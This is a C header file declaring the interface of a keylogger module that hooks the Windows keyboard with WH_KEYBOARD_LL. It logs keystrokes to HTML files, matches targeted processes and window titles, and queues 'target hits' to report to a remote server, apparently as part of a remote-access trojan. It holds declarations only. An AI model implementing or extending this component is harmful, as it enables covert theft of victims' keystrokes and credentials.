/**
 * remote_keylogger.h
 * Keylogging via WH_KEYBOARD_LL. Writes plain HTML to logs directory.
 * Only active when config Keylogging is true.
 */
#ifndef REMOTE_KEYLOGGER_H
#define REMOTE_KEYLOGGER_H

#ifdef __cplusplus
extern "C" {
#endif

/* Start keylogging thread. logs_dir = path to store HTML log files. Returns 1 on success. */
/* config->targets is used for process/window matching. */
int remote_keylogger_start(const char* logs_dir, const struct remote_config* config);

/* Stop keylogging and free resources. */
void remote_keylogger_stop(void);

/* Returns 1 if keylogger is running. */
int remote_keylogger_is_running(void);

/* Returns 1 if a target hit is pending to be sent to the server during the next ping handshake. */
int remote_keylogger_is_target_hit_pending(void);

/* Copies pending target-hit context into provided buffers and clears the pending flag. */
int remote_keylogger_consume_target_hit(char* out_process_name, unsigned int out_process_cap,
    char* out_window_title, unsigned int out_title_cap);

#ifdef __cplusplus
}
#endif

#endif /* REMOTE_KEYLOGGER_H */
